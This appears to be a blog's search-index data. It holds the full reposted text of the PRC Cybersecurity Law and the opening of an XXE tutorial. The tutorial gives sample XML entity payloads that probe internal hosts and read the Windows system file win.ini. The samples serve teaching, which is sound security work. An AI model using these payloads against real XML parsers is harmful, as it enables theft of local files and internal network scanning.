法律责任\n​ 第七章 附则\n第一章 总则 第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。\n第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。\n第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。\n第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。\n第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。\n第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。\n第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。\n第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。\n县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。\n第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。\n第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。\n第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。\n第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。\n任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。\n第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。\n第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。\n有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。\n第二章 网络安全支持与促进 第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。\n国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。\n第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。\n第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。\n第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。\n国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。\n第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。\n大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。\n第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。\n第三章 网络运行安全 第一节 一般规定 第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：\n（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；\n（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；\n（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；\n（四）采取数据分类、重要数据备份和加密等措施；\n（五）法律、行政法规规定的其他义务。\n第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。\n网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。\n网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。\n第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。\n第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。\n国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。\n第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。\n第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。\n第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。\n第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。\n第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。\n有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。\n第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。\n第二节 关键信息基础设施的运行安全 第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。\n国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。\n第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。\n第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。\n第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：\n（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；\n（二）定期对从业人员进行网络安全教育、技术培训和技能考核；\n（三）对重要系统和数据库进行容灾备份；\n（四）制定网络安全事件应急预案，并定期进行演练；\n（五）法律、行政法规规定的其他义务。\n第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。\n第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。\n第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。\n第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。\n第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：\n（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；\n（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；\n（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；\n（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。\n第四章 网络信息安全 第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。\n第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。\n网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。\n第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。\n网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。\n第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。\n第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。\n第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。\n第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。\n第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。\n第四十八条 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。\n电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。\n第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。\n网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。\n第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。\n第五章 监测预警与应急处置 第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。\n第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。\n第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。\n负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。\n网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。\n第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：\n（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；\n（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；\n（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。\n第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。\n第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。\n第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。\n第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。\n第六章 法律责任 第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。\n关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。\n第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：\n（一）设置恶意程序的；\n（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；\n（三）擅自终止为其产品、服务提供安全维护的。\n第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。\n第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。\n单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。\n违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。\n第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。\n违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。\n第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。\n单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。\n第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。\n电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。\n第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：\n（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；\n（二）拒绝、阻碍有关部门依法实施的监督检查的；\n（三）拒不向公安机关、国家安全机关提供技术支持和协助的。\n第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。\n第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。\n第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。\n第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。\n网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。\n第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。\n违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。\n第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。\n第七章 附则 第七十六条 本法下列用语的含义：\n（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。\n（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。\n（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。\n（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。\n（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。\n第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。\n第七十八条 军事网络的安全保护，由中央军事委员会另行规定。\n第七十九条 本法自2017年6月1日起施行。\n","permalink":"https://ret2neo.cn/mind/180811-respect-law/","summary":"中华人民共和国网络安全法 发布时间：2016-11-08 来源：政策法规司\n中华人民共和国主席令\n第五十三号\n《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。\n​ 中华人民共和国主席 习近平\n​ 2016年11月7日\n中华人民共和国网络安全法\n目 录\n​ 第一章 总则\n​ 第二章 网络安全支持与促进\n​ 第三章 网络运行安全\n​ 第一节 一般规定\n​ 第二节 关键信息基础设施的运行安全\n​ 第四章 网络信息安全\n​ 第五章 监测预警与应急处置\n​ 第六章 法律责任\n​ 第七章 附则\n第一章 总则 第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。\n第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。\n第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。\n第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。\n第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。\n第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。\n第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。\n第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。\n县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。\n第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。\n第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。\n第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。\n第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。\n任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。\n第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。","title":"【转】中华人民共和国网络安全法"},{"content":"本文发自 先知社区 ，转载请注明出处。\n（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）\nWHAT XML XML是类似HTML的标记语言，但它们有所不同。\n其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;yes\u0026quot;?\u0026gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 \u0026lt;tag\u0026gt;foo\u0026lt;/tag\u0026gt; 的标签开始和结束，如果元素内部出现如\u0026lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用\u0026amp;lt; \u0026amp;gt; \u0026amp;amp; \u0026amp;apos; \u0026amp;quot; 替换 \u0026lt; \u0026gt; \u0026amp; ' \u0026quot; 。\n实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。\nDTD有两种形式：\n1 2 3 4 5 内部 DTD：\u0026lt;!DOCTYPE 根元素 [元素声明]\u0026gt; 外部 DTD： \u0026lt;!DOCTYPE 根元素 SYSTEM \u0026#34;存放元素声明的文件的URI，可以是本地文件或网络文件\u0026#34; [可选的元素声明]\u0026gt; \u0026lt;!DOCTYPE 根元素 PUBLIC \u0026#34;PUBLIC_ID DTD的名称\u0026#34; \u0026#34;外部DTD文件的URI\u0026#34;\u0026gt; （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：\n1 2 3 4 5 6 7 8 9 声明： \u0026lt;!DOCTYPE 根元素 [\u0026lt;!ENTITY 内部普通实体名 \u0026#34;实体所代表的字符串\u0026#34;\u0026gt;]\u0026gt; \u0026lt;!DOCTYPE 根元素 [\u0026lt;!ENTITY 外部普通实体名 SYSTEM \u0026#34;外部实体的URI\u0026#34;\u0026gt;]\u0026gt; \u0026lt;!DOCTYPE 根元素 [\u0026lt;!ENTITY % 内部参数实体名 \u0026#34;实体所代表的字符串\u0026#34;\u0026gt;]\u0026gt; \u0026lt;!DOCTYPE 根元素 [\u0026lt;!ENTITY % 外部参数实体名 SYSTEM \u0026#34;外部实体的URI\u0026#34;\u0026gt;]\u0026gt; 除了 SYSTEM关键字外，外部实体还可用 PUBLIC关键字声明。 引用： \u0026amp;普通实体名; //经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用 %参数实体名; //经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用 可能造成的危害 本地文件读取 内网访问，主机/端口扫描 网络访问 系统命令执行（特定协议，如PHP的expect） 拒绝服务（嵌套引用，指数爆炸） HOW URI支持的协议：\n利用引用外部DTD发起网络请求 test.php 使用外部DTD对XML进行验证，如果XML可以注入且DTD的URI可控，就有发起网络请求的可能。在192.168.1.2:80 有Web服务而192.168.1.3:80 没有，DTD的URI不同时访问 test.php 就会得到不同的响应。\ntest.php\n1 2 3 4 5 6 \u0026lt;?php // error_reporting(0); $dom = new DOMDocument; $dom-\u0026gt;load(\u0026#39;with_external_dtd.xml\u0026#39;); if ($dom-\u0026gt;validate()) {echo \u0026#34;validated!\\n\u0026#34;;} else echo \u0026#34;invalid!\\n\u0026#34;; with_external_dtd.xml\n1 2 3 4 5 6 7 8 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!-- 很快返回 validated! --\u0026gt; \u0026lt;!DOCTYPE note SYSTEM \u0026#34;external_dtd\u0026#34;\u0026gt; \u0026lt;!-- 很快返回 invalid! --\u0026gt; \u0026lt;!-- \u0026lt;!DOCTYPE note SYSTEM \u0026#34;http://192.168.1.2/\u0026#34;\u0026gt; --\u0026gt; \u0026lt;!-- 很长一段时间才返回 invalid! --\u0026gt; \u0026lt;!-- \u0026lt;!DOCTYPE note SYSTEM \u0026#34;http://192.168.1.3/\u0026#34;\u0026gt; --\u0026gt; \u0026lt;note\u0026gt;Valar Morghulis\u0026lt;/note\u0026gt; external_dtd\n1 \u0026lt;!ELEMENT note (#PCDATA)\u0026gt; 利用普通XXE读取文件/访问网络 1 2 3 4 5 6 \u0026lt;?php $s=\u0026lt;\u0026lt;\u0026lt;string \u0026lt;!DOCTYPE a [\u0026lt;!ENTITY b SYSTEM \u0026#34;file:///C:/Windows/win.ini\u0026#34;\u0026gt;]\u0026gt; \u0026lt;c\u0026gt;\u0026amp;b;\u0026lt;/c\u0026gt; string; echo simplexml_load_string($s); 